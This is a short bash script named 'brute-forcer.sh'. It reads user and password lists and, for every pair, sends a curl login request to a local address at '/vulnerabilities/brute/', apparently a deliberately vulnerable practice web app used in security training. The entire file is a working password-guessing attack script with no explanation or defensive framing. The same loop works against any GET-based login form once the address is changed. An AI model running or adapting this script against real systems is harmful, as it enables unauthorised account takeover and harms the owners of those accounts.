function usage() {
	echo 'Usage:'
	echo '    ./brute-forcer.sh user-list.txt password-list.txt'
}

[[ -z $1 || -z $2 ]] && usage && exit
[[ -f "$1" ]] && USERLIST=$(cat $1) || USERLIST=$1
[[ -f "$2" ]] && PASSLIST=$(cat $2) || PASSLIST=$2

IP='192.168.0.11'

function brute_force() {
	for user in $USERLIST;
	do
		for pass in $PASSLIST;
		do
			curl -v "http://$IP/vulnerabilities/brute/?username=$user&password=$pass&Login=Login#"
		done
	done
}

brute_force
